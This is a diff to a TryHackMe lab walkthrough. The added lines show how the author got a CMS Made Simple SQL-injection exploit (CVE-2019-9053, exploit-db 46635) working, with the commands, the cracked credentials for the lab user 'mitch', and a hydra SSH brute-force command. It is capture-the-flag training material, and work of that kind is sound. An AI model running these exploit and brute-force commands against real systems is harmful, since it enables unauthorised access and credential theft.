@@ -152,7 +152,7 @@ I check **exploit-db** to see if the CMS version is exploitable and it appears t
 
 I download and run the exploit but I can't get it to work properly. It just tries to enumerate and doesn't actually populate any of the info it's supposed to:
 
-`python2 46635.py -u http://10.10.184.34 --crack -w rockyou.txt`
+`python2 46635.py -u http://10.10.184.34/simple --crack -w rockyou.txt`
 
 ```
 [+] Salt for password found: 
@@ -163,7 +163,32 @@ I download and run the exploit but I can't get it to work properly. It just trie
 
 And it is the correct exploit we're supposed to run because typing **CVE-2019-9053** into the TryHackMe question says it's correct. We also see that in the script it's checking for **SQLi** vulnerabilities so that answers the 4th question.
 
-Given the file we found on the FTP server which mentioned a user named mitch, and it said they used a weak password, I'm just going to brute force it with **hydra**:
+I convert the script from python2 to python3 with **2to3**:
+
+`2to3 46635.py -w`
+
+```
+RefactoringTool: Files that were modified:
+RefactoringTool: 46635.py
+```
+
+There are still errors with the script, so I have to modify it further in order to get it working properly, but I eventually do. Here's a copy of the modified and working script:
+
+[**46635.py**](images/46635.py)
+
+And running it:
+
+`python3 46635.py -u http://10.10.56.214/simple --crack -w rockyou.txt`
+
+```
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+```
+
+Note: You can also just crack the password using **hydra** having guessed the username **mitch** from the file on the ftp server:
 
 `hydra -l mitch -s 2222 -P rockyou.txt 10.10.184.34 ssh`
 
@@ -313,3 +338,22 @@ Many thanks to:
 <br>
 
 You can visit them at: [**https://tryhackme.com**](https://tryhackme.com)
+
+
+
+
+
+
+`searchsploit -m 46635`
+
+```
+  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
+      URL: https://www.exploit-db.com/exploits/46635
+     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
+File Type: Python script, ASCII text executable
+
+Copied to: /home/kali/work/46635.py
+```
+
+
+
